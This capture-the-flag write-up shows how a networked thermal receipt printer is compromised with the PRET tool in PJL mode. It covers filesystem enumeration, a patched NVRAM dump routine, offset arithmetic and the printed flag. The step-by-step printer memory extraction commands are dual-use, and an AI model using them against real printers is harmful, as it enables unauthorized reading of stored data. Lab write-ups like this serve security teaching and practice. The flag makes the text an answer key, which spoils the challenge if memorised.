# Thermal Receipt

| Field | Details |
|-------|---------|
| **Challenge** | Thermal Receipt |
| **Platform** | Cyber Apocalypse CTF 2026: The Salt Crown |
| **Category** | Hardware |
| **Flag** | `HTB{th3rm4l_j0urn4l_r3c4ll_9cdb6edfff18039aca883569edd8afd9}` |

---

## Overview

A networked thermal receipt printer: RiverGate RG-T80II: accepts raw TCP
connections on a single port. The challenge lore frames it as a Crownspire
checkpoint printer whose last transaction receipt holds an authorization token.
The description explicitly names **PRET in PJL mode** as the intended starting
point.

The path to the flag:

1. Connect with PRET in PJL mode and enumerate the printer's flash filesystem.
2. Read the electronic journal receipts in `0:/journal/`. The final one doesn't
   print the auth code directly: it stores it in NVRAM and tells you the key
   name and byte address.
3. Fix two Python 3 encoding bugs in PRET's `nvram dump` routine.
4. Dump NVRAM and decode the file offset that maps to the target address.

---

## Reconnaissance

### Identifying the Printer

```
$ python3 pret.py <host>:<port> pjl
Connection to <host>:<port> established
Device: RiverGate RG-T80II Thermal Receipt Printer
```

### Filesystem Enumeration

```
154.57.164.67:30614:/> chvol 0:
154.57.164.67:30614:/> find
./readme.txt
./config/device.txt
./spool/README.txt
./journal/last.txt
./journal/receipt_0000.txt
./journal/receipt_0001.txt
./journal/receipt_0002.txt
./journal/receipt_0003.txt
```

Key file: `0:/config/device.txt`:

```
MODEL=RG-T80II
FW=3.18
CMDSET=PJL/PCL/ESC/POS
EJOURNAL=ON
LAST_CLOSED_SLOT=NVRAM:EJ_LAST
```

The filesystem is 64 KB of flash (`TOTAL=65536`, `FREE=49152`). The
`EJOURNAL=ON` flag confirms that all receipts are retained in `0:/journal/`.

### PJL Environment

```
154.57.164.67:30614:/> env
LANG=PJL [2 RANGE]
RET=ON [2 RANGE]
EJOURNAL=ON [2 RANGE]
EJINDEX=NVRAM [READONLY]
```

`EJINDEX=NVRAM [READONLY]` means the printer stores the journal index inside
NVRAM and won't let it be changed through the normal `SET` interface.

---

## The Key Lead

Reading the journal receipts in order:

```
receipt_0000.txt → AUTH CODE: RG-5812-OK
receipt_0001.txt → AUTH CODE: RG-4421-OK
receipt_0002.txt → AUTH CODE: RG-9014-OK
receipt_0003.txt → AUTH CODE: STORED IN NVRAM
                   NVRAM REF: EJ_AUTH_0421
                   ADDR=53264  LEN=60
```

`0:/journal/last.txt` confirms `receipt_0003.txt` is the most recent closed
slot. The auth code is 60 bytes starting at NVRAM address **53264**.

---

## Tooling Fix: PRET Python 3 Encoding Bugs

PRET v0.40 was written for Python 2. Two bugs in `pjl.py` cause `nvram dump`
to write a zero-length file under Python 3:

**Bug 1**: line 741: empties the dump file using a str literal instead of bytes:

```python
# broken
file().write(lpath, "")
# fixed
file().write(lpath, b"")
```

**Bug 2**: line 752: appends string data to a binary file:

```python
# broken
file().append(lpath, data)
# fixed
file().append(lpath, data.encode('latin-1'))
```

`data` is a string of characters assembled from `conv().chr(n)` for each
`DATA=n` match. `latin-1` preserves all byte values 0-255 without loss.

---

## NVRAM Dump and Address Decoding

### Why `nvram dump` Covers Address 53264

PRET's `nvram dump` scans a **fixed memspace**: not a contiguous 0-to-N
range but three discontiguous segments hard-coded in `pjl.py`:

```python
memspace = (
    list(range(0, 8192))         # segment 1: 8192 addresses
    + list(range(32768, 33792))  # segment 2: 1024 addresses
    + list(range(53248, 59648))  # segment 3: 6400 addresses
)
# total: 15616 addresses
```

NVRAM address 53264 sits inside segment 3 (`range(53248, 59648)`): it **is**
covered by a complete dump.

### Mapping Address → File Offset

The dump file is a flat byte array: one byte per memspace element, in order.
File offset = sum of preceding segment sizes + position within the current
segment:

```
offset(53264) = 8192          (segment 1 size)
              + 1024          (segment 2 size)
              + (53264 − 53248)  (position in segment 3)
              = 8192 + 1024 + 16
              = 9232
```

**File offset 9232 = NVRAM address 53264.**

### Reading the Flag

```python
data = open('nvram/154.57.164.67:30614', 'rb').read()
flag_bytes = data[9232:9292]   # 60 bytes
print(flag_bytes.decode('latin-1'))
# HTB{th3rm4l_j0urn4l_r3c4ll_9cdb6edfff18039aca883569edd8afd9}
```

### NVRAM Layout (from dump)

| File offsets | NVRAM addresses | Content |
|---|---|---|
| 512-545 | 512-545 | `MODEL=RG-T80II`, `FW=3.18`, `EJOURNAL=ON` |
| 7693-7727 | 7693-7727 | `EJ_LAST=0:/journal/receipt_0003.txt` |
| 8717-8728 | 33293-33304 | `EJ_AUTH_0421` (key name, in segment 2) |
| **9232-9291** | **53264-53323** | **flag (60 bytes, in segment 3)** |

Note: file offsets ≠ NVRAM addresses for segments 2 and 3 because the
memspace skips 0x2000-0x7FFF and 0x8400-0xCFFF.

### Instance State Matters

Previous instances returned all-zero bytes at offset 9232. Heavy NVRAM
scanning (thousands of individual `RNVRAM` reads) appears to corrupt or reset
the challenge state on those instances. A fresh instance with the patched dump
routine produced the complete 15616-byte file with the flag intact.

---

## Dead Ends Explored

**Direct `@PJL RNVRAM ADDRESS=53264`**: returns `DATA=0` on corrupted
instances. On a fresh instance, also returns `DATA=0` when sent individually: the nvram dump (batch mode) is required to get the correct value.

**Extended NVRAM range (65536-262144)**: all addresses outside 0-59647
return `No data received.` from individual reads. No data here.

**`@PJL FSUPLOAD NAME="NVRAM:53264"` and `NAME="NV:EJ_AUTH_0421"`**: both
return `FILEERROR=1`. The printer doesn't expose NVRAM as a named filesystem.

**`@PJL DINQUIRE EJ_AUTH_0421`** and variations: empty response. The key
is not surfaced as a PJL environment variable.

**PCL macro invocations** (`ESC &f n Y`): the printer reports
`"Macros (Internal)"` under `@PJL INFO MACROS` but all invocation attempts
(IDs 1, 2, 3, 5, 100, 421, 1000) produced no output.

**ESC/POS NV user memory read (`FS g 2`)**: no response. The printer's
ESC/POS layer doesn't appear to implement NV user memory commands.

**Raw socket RNVRAM**: all responses empty. The printer likely restricts to
one active TCP connection at a time; PRET's connection was being blocked, or
the PJL framing in the raw approach was subtly wrong. PRET's own connection
handling works correctly.

---

## Takeaways

**PRET's `nvram dump` uses a discontiguous memspace.** The dump file is not
indexed by NVRAM address. Before you grep a dump for the flag, calculate the
correct file offset using the three-segment layout in `pjl.py`.

**The Python 3 encoding bugs are silent.** Both bugs leave the dump file on
disk: one zero-bytes it, one writes an empty string. Neither raises an
exception. Always verify dump file size against the expected 15616 bytes
(`len(memspace)`) before drawing conclusions from its contents.

**Instance freshness is a variable.** Aggressive scanning (tens of thousands
of individual RNVRAM reads, repeated across multiple connection attempts) can
corrupt the challenge Docker container's state. If the flag region reads as
zeros on every approach, request a new instance before assuming the flag isn't
there.

**Follow the data, not the protocol.** The printer supports PJL, PCL, and
ESC/POS. Spending time on PCL macros, ESC/POS NV memory, and custom PJL verbs
was wasted effort: the chain was always: filesystem → journal → NVRAM address
→ dump → flag. The challenge description's pointer to PRET in PJL mode was the
correct scope all along.
